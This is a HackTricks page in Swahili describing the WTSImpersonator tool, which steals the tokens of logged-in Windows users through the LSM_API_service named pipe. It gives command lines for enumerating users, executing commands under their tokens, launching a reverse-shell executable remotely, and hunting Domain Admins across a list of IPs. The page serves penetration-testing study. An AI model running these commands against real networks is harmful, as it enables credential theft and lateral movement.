{{#include ../../banners/hacktricks-training.md}}

Chombo cha **WTS Impersonator** kinatumia **"\\pipe\LSM_API_service"** RPC Named pipe ili kuhesabu kwa siri watumiaji walioingia na kuiba token zao, ikiepuka mbinu za jadi za Token Impersonation. Njia hii inarahisisha harakati za upande mmoja ndani ya mitandao. Ubunifu wa mbinu hii unahusishwa na **Omri Baso, ambaye kazi yake inapatikana kwenye [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Msingi wa Kazi

Chombo kinatumika kupitia mfululizo wa API calls:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Key Modules and Usage

- **Enumerating Users**: Local na remote user enumeration inawezekana kwa kutumia zana, kwa kutumia amri kwa kila hali:

- Locally:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotely, kwa kubainisha anwani ya IP au jina la mwenyeji:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: Moduli za `exec` na `exec-remote` zinahitaji muktadha wa **Service** ili kufanya kazi. Utekelezaji wa ndani unahitaji tu executable ya WTSImpersonator na amri:

- Mfano wa utekelezaji wa amri za ndani:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe inaweza kutumika kupata muktadha wa huduma:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Inahusisha kuunda na kufunga huduma kwa mbali kama PsExec.exe, ikiruhusu utekelezaji kwa ruhusa zinazofaa.

- Mfano wa utekelezaji wa mbali:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Inalenga watumiaji maalum kwenye mashine nyingi, ikitekeleza msimbo chini ya ithibati zao. Hii ni muhimu hasa kwa kulenga Domain Admins wenye haki za admin za ndani kwenye mifumo kadhaa.
- Mfano wa matumizi:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
